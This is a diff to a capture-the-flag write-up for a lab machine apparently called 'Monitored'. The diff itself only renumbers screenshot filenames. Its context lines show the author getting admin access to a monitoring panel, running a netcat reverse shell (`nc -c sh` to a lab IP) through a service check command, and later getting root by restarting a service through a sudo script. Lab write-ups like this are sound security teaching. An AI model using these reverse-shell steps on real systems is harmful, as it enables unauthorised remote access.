@@ -181,19 +181,19 @@ _Note_ : If you ever need to delete a user that you've created or want to mess w
 
 Let's try to connect to our user `unebonnenote` with password `stp` now :
 
-<img src="/assets/img/MonitoredWriteup/mon7.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
+<img src="/assets/img/MonitoredWriteup/mon11.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
 With our admin power, it is now possible for us to get into the machine by accessing the `Command` panel and adding our reverse shell command crafted [here](https://www.revshells.com/) (`nc -c sh 10.10.14.134 6969`) :
 
-<img src="/assets/img/MonitoredWriteup/mon8.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
+<img src="/assets/img/MonitoredWriteup/mon7.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
  We then need to run a service that will execute that command, so let's create one in the `service management` tab :
 
-<img src="/assets/img/MonitoredWriteup/mon9.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
+<img src="/assets/img/MonitoredWriteup/mon8.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
 If we click on `run check command`, our command should execute, if we look to our terminal waiting for the reverse shell to connect :
 
-<img src="/assets/img/MonitoredWriteup/mon10.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
+<img src="/assets/img/MonitoredWriteup/mon9.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
 That's the user flag caught! We can stabilise the shell using [this trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
 
@@ -242,7 +242,7 @@ nc -c sh 10.10.14.134 6968
 
 Now let's do a `sudo manage_service.sh stop npcd` and then a `sudo manage_service.sh start npcd`. And check our terminal waiting for another reverse shell :
 
-<img src="/assets/img/MonitoredWriteup/mon11.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
+<img src="/assets/img/MonitoredWriteup/mon10.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
 And that's the root flag!
 
